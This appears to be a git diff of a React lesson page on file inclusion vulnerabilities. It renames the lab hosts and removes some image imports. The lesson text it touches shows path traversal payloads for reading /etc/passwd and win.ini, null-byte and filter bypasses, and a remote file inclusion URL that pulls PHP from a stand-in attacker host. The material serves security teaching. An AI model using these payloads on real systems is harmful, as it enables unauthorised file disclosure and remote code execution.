@@ -11,11 +11,6 @@ import exampleImage4 from "../../assets/img/File Inclusion/image_4.webp";
 import exampleImage5 from "../../assets/img/File Inclusion/image_5.webp";
 import exampleImage6 from "../../assets/img/File Inclusion/image_6.webp";
 import exampleImage7 from "../../assets/img/File Inclusion/image_7.webp";
-import exampleImage8 from "../../assets/img/File Inclusion/image_8.webp";
-import exampleImage9 from "../../assets/img/File Inclusion/image_9.webp";
-import exampleImage10 from "../../assets/img/File Inclusion/image_10.webp";
-import exampleImage11 from "../../assets/img/File Inclusion/image_11.webp";
-import exampleImage12 from "../../assets/img/File Inclusion/image_12.webp";
 import UseFaqSection from "../../UseFaqSection/UseFaqSection.jsx";
 import LandingLab from "../../LandingLab/LandingLab.jsx";
 export default function FileInclusion() {
@@ -81,7 +76,7 @@ export default function FileInclusion() {
                     request to the webserver that includes a file to display.
                     For example, if a user wants to access and display their CV
                     within the web application, the request may look as follows,
-                    <a href="http://webapp.thm/get.php?file=userCV.pdf">
+                    <a href="http://webapp.cyberlaps/get.php?file=userCV.pdf">
                       Click Here
                     </a>
                     , where the file is the parameter and the userCV.pdf, is the
@@ -151,7 +146,7 @@ export default function FileInclusion() {
                     If the attacker finds the entry point, which in this case
                     get.php?file=, then the attacker may send something as
                     follows,
-                    http://webapp.thm/get.php?file=../../../../etc/passwd
+                    http://webapp.cyberlaps/get.php?file=../../../../etc/passwd
                   </p>
                   <p>
                     Suppose there isn’t input validation, and instead of
@@ -175,9 +170,9 @@ export default function FileInclusion() {
                     c:\boot.ini, then the attacker can try the following
                     depending on the target OS version:
                   </p>
-                  <p>http://webapp.thm/get.php?file=../../../../boot.ini or</p>
+                  <p>http://webapp.cyberlaps/get.php?file=../../../../boot.ini or</p>
                   <p>
-                    http://webapp.thm/get.php?file=../../../../windows/win.ini
+                    http://webapp.cyberlaps/get.php?file=../../../../windows/win.ini
                   </p>
                   <p>
                     The same concept applies here as with Linux operating
@@ -252,12 +247,12 @@ export default function FileInclusion() {
                         parameter lang to include the file of the page. The call
                         can be done by sending the following HTTP request as
                         follows:
-                        <a href="http://webapp.thm/index.php?lang=EN.php">
-                          http://webapp.thm/index.php?lang=EN.php
+                        <a href="http://webapp.cyberlaps/index.php?lang=EN.php">
+                          http://webapp.cyberlaps/index.php?lang=EN.php
                         </a>{" "}
                         to load the English page or
-                        <a href="http://webapp.thm/index.php?lang=AR.php">
-                          http://webapp.thm/index.php?lang=AR.php
+                        <a href="http://webapp.cyberlaps/index.php?lang=AR.php">
+                          http://webapp.cyberlaps/index.php?lang=AR.php
                         </a>{" "}
                         to load the Arabic page, where EN.php and AR.php files
                         exist in the same directory.
@@ -269,8 +264,8 @@ export default function FileInclusion() {
                         /etc/passwd file, which contains sensitive information
                         about the users of the Linux operating system, we can
                         try the following:
-                        <a href="http://webapp.thm/get.php?file=/etc/passwd">
-                          http://webapp.thm/get.php?file=/etc/passwd
+                        <a href="http://webapp.cyberlaps/get.php?file=/etc/passwd">
+                          http://webapp.cyberlaps/get.php?file=/etc/passwd
                         </a>
                       </p>
                       <p>
@@ -335,8 +330,8 @@ export default function FileInclusion() {
                         exploit:
                       </p>
                       <p>
-                        <a href="http://webapp.thm/index.php?lang=../../../../etc/passwd">
-                          http://webapp.thm/index.php?lang=../../../../etc/passwd
+                        <a href="http://webapp.cyberlaps/index.php?lang=../../../../etc/passwd">
+                          http://webapp.cyberlaps/index.php?lang=../../../../etc/passwd
                         </a>
                       </p>
                     </li>
@@ -363,10 +358,10 @@ export default function FileInclusion() {
                       </p>
                       <p>
                         In this scenario, we have the following entry point:{" "}
-                        <a href="http://webapp.thm/index.php?lang=EN">
-                          http://webapp.thm/index.php?lang=EN
+                        <a href="http://webapp.cyberlaps/index.php?lang=EN">
+                          http://webapp.cyberlaps/index.php?lang=EN
                         </a>
-                        . If we enter an invalid input, such as THM, we get the
+                        . If we enter an invalid input, such as cyberlaps, we get the
                         following error
                       </p>
                       <div className="terminal-container">
@@ -380,9 +375,9 @@ export default function FileInclusion() {
                               <span className="token command-c">
                                 <span className="token info punctuation">
                                   <span className="token user">
-                                    Warning: include(languages/THM.php): failed
+                                    Warning: include(languages/cyberlaps.php): failed
                                     to open stream: No such file or directory in
-                                    /var/www/html/THM-4/index.php on line 12
+                                    /var/www/html/cyberlaps-4/index.php on line 12
                                   </span>
                                 </span>
                               </span>
@@ -392,9 +387,9 @@ export default function FileInclusion() {
                       </div>
                       <p>
                         The error message discloses significant information. By
-                        entering THM as input, an error message shows what the
+                        entering cyberlaps as input, an error message shows what the
                         include function looks like:
-                        include(languages/THM.php);.
+                        include(languages/cyberlaps.php);.
                       </p>
                       <p>
                         If you look at the directory closely, we can tell the
@@ -407,7 +402,7 @@ export default function FileInclusion() {
                       <p>
                         Also, the error message disclosed another important
                         piece of information about the full web application
-                        directory path which is /var/www/html/THM-4/
+                        directory path which is /var/www/html/cyberlaps-4/
                       </p>
                       <p>
                         To exploit this, we need to use the ../ trick, as
@@ -415,13 +410,13 @@ export default function FileInclusion() {
                         the current folder. Let’s try the following:
                       </p>
                       <p>
-                        <a href="http://webapp.thm/index.php?lang=../../../../etc/passwd">
-                          http://webapp.thm/index.php?lang=../../../../etc/passwd
+                        <a href="http://webapp.cyberlaps/index.php?lang=../../../../etc/passwd">
+                          http://webapp.cyberlaps/index.php?lang=../../../../etc/passwd
                         </a>
                       </p>
                       <p className="note">
                         Note that we used 4 ../ because we know the path has
-                        four levels /var/www/html/THM-4. But we still receive
+                        four levels /var/www/html/cyberlaps-4. But we still receive
                         the following error:
                       </p>
                       <div className="terminal-container">
@@ -438,7 +433,7 @@ export default function FileInclusion() {
                                     Warning:
                                     include(languages/../../../../../etc/passwd.php):
                                     failed to open stream: No such file or
-                                    directory in /var/www/html/THM-4/index.php
+                                    directory in /var/www/html/cyberlaps-4/index.php
                                     on line 12
                                   </span>
                                 </span>
@@ -485,12 +480,12 @@ export default function FileInclusion() {
                         the NullByte %00 or the current directory trick at the
                         end of the filtered keyword /.. The exploit will be
                         similar to
-                        <a href="http://webapp.thm/index.php?lang=/etc/passwd/">
-                          http://webapp.thm/index.php?lang=/etc/passwd/
+                        <a href="http://webapp.cyberlaps/index.php?lang=/etc/passwd/">
+                          http://webapp.cyberlaps/index.php?lang=/etc/passwd/
                         </a>
                         . We could also use
-                        <a href="http://webapp.thm/index.php?lang=/etc/passwd%00">
-                          http://webapp.thm/index.php?lang=/etc/passwd%00
+                        <a href="http://webapp.cyberlaps/index.php?lang=/etc/passwd%00">
+                          http://webapp.cyberlaps/index.php?lang=/etc/passwd%00
                         </a>
                         .
                       </p>
@@ -512,8 +507,8 @@ export default function FileInclusion() {
                         Let’s test out and check the error message!
                       </p>
                       <p>
-                        <a href="http://webapp.thm/index.php?lang=../../../../etc/passwd">
-                          http://webapp.thm/index.php?lang=../../../../etc/passwd
+                        <a href="http://webapp.cyberlaps/index.php?lang=../../../../etc/passwd">
+                          http://webapp.cyberlaps/index.php?lang=../../../../etc/passwd
                         </a>
                       </p>
                       <p>We got the following error!</p>
@@ -530,7 +525,7 @@ export default function FileInclusion() {
                                   <span className="token user">
                                     Warning: include(languages/etc/passwd):
                                     failed to open stream: No such file or
-                                    directory in /var/www/html/THM-5/index.php
+                                    directory in /var/www/html/cyberlaps-5/index.php
                                     on line 15
                                   </span>
                                 </span>
@@ -567,8 +562,8 @@ export default function FileInclusion() {
                         forces the include to read from a defined directory! For
                         example, if the web application asks to supply input
                         that has to include a directory such as:
-                        <a href="http://webapp.thm/index.php?lang=languages/EN.php">
-                          http://webapp.thm/index.php?lang=languages/EN.php
+                        <a href="http://webapp.cyberlaps/index.php?lang=languages/EN.php">
+                          http://webapp.cyberlaps/index.php?lang=languages/EN.php
                         </a>{" "}
                         then, to exploit this, we need to include the directory
                         in the payload like so:
@@ -605,8 +600,8 @@ export default function FileInclusion() {
                   <p>
                     The following figure is an example of steps for a successful
                     RFI attack! Let’s say that the attacker hosts a PHP file on
-                    their own server <span>http://attacker.thm/cmd.txt</span>{" "}
-                    where cmd.txt contains a printing message Hello THM.
+                    their own server <span>http://attacker.cyberlaps/cmd.txt</span>{" "}
+                    where cmd.txt contains a printing message Hello cyberlaps.
                   </p>
                   <div className="terminal-container">
                     <div className="terminal-content">
@@ -619,7 +614,7 @@ export default function FileInclusion() {
                           <span className="token command-c">
                             <span className="token info punctuation">
                               <span className="token user">
-                                <>&lt;</>?PHP echo "Hello THM"; ?<>&gt;</>
+                                <>&lt;</>?PHP echo "Hello cyberlaps"; ?<>&gt;</>
                               </span>
                             </span>
                           </span>
@@ -630,8 +625,8 @@ export default function FileInclusion() {
                   <p>
                     First, the attacker injects the malicious URL, which points
                     to the attacker’s server, such as{" "}
-                    <a href="http://webapp.thm/index.php?lang=http://attacker.thm/cmd.txt">
-                      http://webapp.thm/index.php?lang=http://attacker.thm/cmd.txt
+                    <a href="http://webapp.cyberlaps/index.php?lang=http://attacker.cyberlaps/cmd.txt">
+                      http://webapp.cyberlaps/index.php?lang=http://attacker.cyberlaps/cmd.txt
                     </a>{" "}
                     . If there is no input validation, then the malicious URL
                     passes into the include function. Next, the web app server
@@ -639,7 +634,7 @@ export default function FileInclusion() {
                     file. As a result, the web app includes the remote file into
                     include function to execute the PHP file within the page and
                     send the execution content to the attacker. In our case, the
-                    current page somewhere has to show the Hello THM message.
+                    current page somewhere has to show the Hello cyberlaps message.
                   </p>
                   <p>
                   Visit the following lab URL:{" "}
